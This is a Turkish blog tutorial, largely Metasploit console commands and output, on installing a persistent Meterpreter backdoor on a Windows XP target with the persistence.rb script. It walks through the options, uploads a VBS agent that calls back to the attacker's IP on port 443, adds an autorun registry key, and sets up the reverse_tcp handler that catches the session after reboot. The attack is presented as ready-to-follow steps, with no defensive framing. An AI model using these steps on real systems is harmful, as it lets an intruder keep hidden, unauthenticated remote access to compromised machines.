---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-15T13:57:00Z"
excerpt: Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework
  içinde kullanabileceğiniz bir diğer yöntem de persistence.rb script kodunu kullanmaktır.
guid: https://www.siberoloji.com/?p=1217
id: 1217
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Kalıcı Backdoor
url: /tr/msf-meterpreter-kalici-backdoor/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="persistencerb">Persistence.rb 
<!-- /wp:heading -->

  Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework içinde kullanabileceğiniz bir diğer yöntem de&nbsp;<code>persistence.rb</code>&nbsp;script kodunu kullanmaktır.
 

  Bu yöntem sayesinde, hedef bilgisayar güncellense bile tekrar bağlanma imkanınız bulunmaktadır. Ayrıca, hedef sistemin tekrar başlatılması da bağlantı yapmayı etkilemeyecektir.
 

  Bir önceki konuda,&nbsp;<code>metsvc</code>&nbsp;için yaptığımız uyarıyı burada da tekrarlayalım.&nbsp;<code>persistence.rb</code>&nbsp;arka kapısı, bağlantı için herhangi bir oturum bilgisi kullanmaz. Bu açıklığı keşfeden herkes bağlantı sağlayabilir.
 

  Hedef sistemde meterpreter oturum açtıktan sonra&nbsp;<code>persistence.rb</code>&nbsp;script kodunu kullanmadan önce yardım bilgilerini görüntüleyelim ve bize hangi imkanları sağladığını görelim.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run persistence -h

***[!]***  Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
***[!]***  Example: run post/windows/manage/persistence_exe OPTION***=*** value ***[*** ...]
Meterpreter Script ***for *** creating a persistent backdoor on a target host.

OPTIONS:

    -A   Automatically start a matching exploit/multi/handler to connect to the agent
    -L   Location ***in *** target host to write payload to, ***if *** none %TEMP% will be used.
    -P   Payload to use, default is windows/meterpreter/reverse_tcp.
    -S   Automatically start the agent on boot as a service ***(*** with SYSTEM privileges***)*** 
    -T   Alternate executable template to use
    -U   Automatically start the agent when the User logs on
    -X   Automatically start the agent when the system boots
    -h   This help menu
    -i   The interval ***in *** seconds between each connection attempt
    -p   The port on which the system running Metasploit is listening
    -r   The IP of the system running Metasploit listening ***for *** the connect back
</code></pre>
<!-- /wp:code -->

  Aşağıdaki&nbsp;<code>persistence -U -i 5 -p 443 -r 192.168.1.71</code>&nbsp;komutu hangi işlemleri yapıyor?
 

  <code>-U</code>, bir kullanıcı oturum açtığında bizim bilgisayarımıza otomatik bağlantı yapılmasını sağlar.
 

  <code>-i 5</code>&nbsp;Karşe taraftaki&nbsp;<code>persistence.rb</code>&nbsp;script kodu her 5 saniyede bir bize bağlanmaya çalışır.
 

  <code>-p 443</code>&nbsp;bizim dinleme yapan bilgisayarımızın dinleme yaptığı port numarasıdır.
 

  <code>-r 192.168.1.71</code>&nbsp;bizim dinleme yapan bilgisayarımızın IP numarasıdır.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  run persistence -U -i 5 -p 443 -r 192.168.1.71
***[*** ******* ***]***  Creating a persistent agent: LHOST***=*** 192.168.1.71 LPORT***=*** 443 ***(*** interval***=*** 5 onboot***=*** true***)*** 
***[*** ******* ***]***  Persistent agent script is 613976 bytes long
***[*** ******* ***]***  Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
***[*** ******* ***]***  Agent executed with PID 492
***[*** ******* ***]***  Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
***[*** ******* ***]***  Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
***[*** ******* ***]***  For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Verdiğimiz komut sonucunda başlatılan script, çıktılarda da görüleceği gibi işimiz tamamlandığında log temizleme işleminin nasıl yapılabileceğini de gösteriyor.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
</code></pre>
<!-- /wp:code -->

  Scriptin çalışıp çalışmadığını ve otomatik bağlantı yapıp yapmadığını, hedef bilgisayarı tekrar başlatarak anlayabiliriz. Hedef bilgisayarı yeniden başlatalım.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reboot
Rebooting...
meterpreter ***&gt;***  exit

***[*** ******* ***]***  Meterpreter session 3 closed.  Reason: User exit
</code></pre>
<!-- /wp:code -->

  Dinleyici&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü tekrar başlatalım.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  use exploit/multi/handler
msf exploit***(*** handler***)***  ***&gt;***  set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD ***=&gt;***  windows/meterpreter/reverse_tcp
msf exploit***(*** handler***)***  ***&gt;***  set LHOST 192.168.1.71
LHOST ***=&gt;***  192.168.1.71
msf exploit***(*** handler***)***  ***&gt;***  set LPORT 443
LPORT ***=&gt;***  443
msf exploit***(*** handler***)***  ***&gt;***  exploit

***[*** ******* ***]***  Started reverse handler on 192.168.1.71:443
***[*** ******* ***]***  Starting the payload handler...
</code></pre>
<!-- /wp:code -->

  Hedef bilgisayar tekrar başladığında, oturum açılır açılmaz yerel bilgisayara bağlantı, aşağıda görüldüğü gibi tekrar sağlanacaktır.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">***[*** ******* ***]***  Sending stage ***(*** 748544 bytes***)***  to 192.168.1.161
***[*** ******* ***]***  Meterpreter session 5 opened ***(*** 192.168.1.71:443 -&gt; 192.168.1.161:1045***)***  at 2010-08-21 12:31:42 -0600

meterpreter ***&gt;***  sysinfo
Computer: XEN-XP-SP2-BARE
OS      : Windows XP ***(*** Build 2600, Service Pack 2***)*** .
Arch    : x86
Language: en_US
meterpreter ***&gt;*** </code></pre>
<!-- /wp:code -->